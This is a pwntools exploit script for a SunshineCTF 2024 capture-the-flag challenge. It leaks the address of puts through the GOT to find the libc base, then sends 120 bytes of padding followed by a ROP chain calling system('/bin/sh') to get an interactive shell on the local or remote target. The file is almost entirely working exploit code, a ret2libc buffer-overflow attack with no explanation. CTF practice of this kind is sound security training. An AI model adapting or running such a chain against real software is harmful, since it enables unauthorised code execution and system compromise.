#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="debug",
        os="linux",
        terminal=["alacritty", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "2024.sunshinectf.games"
PORT =  24608

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)

def bug(p, value):
    ru(p,b"Input Menu Option")
    sl(p,b"1")
    ru(p,b"bug")
    sl(p,value)


def leak(p, addr):
    ru(p,b"Input Menu Option")
    sl(p,b"0")
    ru(p,b"leak")
    sl(p,"%i" % addr)

def exploit(p,e,l):
        
    pad = b"A" * 120
    
    leak(p,e.got["puts"])
    
    p.recvline()
    libc_leak = int(p.recvline(),16) - l.sym["puts"]
    l.address = libc_leak

    r = ROP(l) 
    log.info(f"Leaked libc base {hex(libc_leak)}")

    chain = p64(r.find_gadget(["ret"])[0]) 
    chain += p64(r.find_gadget(["pop rdi", "ret"])[0])

    chain += p64(next(l.search(b"/bin/sh\x00")))
    chain += p64(l.sym["system"])

    bug(p,pad+chain)


    p.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    l = ELF("./libc.so.6")
    exploit(p,e,l)
